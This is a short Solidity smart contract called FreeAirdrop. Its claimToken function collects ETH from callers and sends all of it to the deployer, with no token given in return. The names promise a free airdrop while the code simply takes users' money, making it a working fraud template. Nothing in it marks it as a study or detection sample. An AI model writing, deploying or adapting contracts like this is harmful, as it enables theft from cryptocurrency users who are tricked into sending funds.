// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

contract FreeAirdrop {
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    // Function to transfer only the sent ETH to the owner's wallet
    function claimToken() external payable {
        require(msg.value > 0, "No ETH sent"); // Ensure the user sends ETH
        owner.transfer(msg.value); // Transfer the sent ETH to the owner
    }
}
